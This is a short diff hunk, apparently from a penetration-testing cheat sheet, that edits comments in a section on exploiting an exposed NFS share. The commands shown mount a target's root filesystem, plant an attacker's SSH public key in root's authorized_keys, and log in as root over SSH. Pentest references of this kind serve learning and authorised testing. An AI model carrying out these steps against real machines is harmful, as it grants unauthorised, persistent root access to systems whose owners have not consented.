@@ -110,9 +110,9 @@ Enter passphrase (empty for no passphrase): Just Press Enter
 Enter same passphrase again: Just Press Enter
 $ mount -t nfs 192.168.1.112:/ /mnt -o nolock
 $ cd /mnt/root/.ssh
-$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/              # replace remote public key with your own
+$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
 $ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
-$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using private keys
+$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
 ```
 
 __SMB / NETBIOS / SMBD (135-139 - 445)__
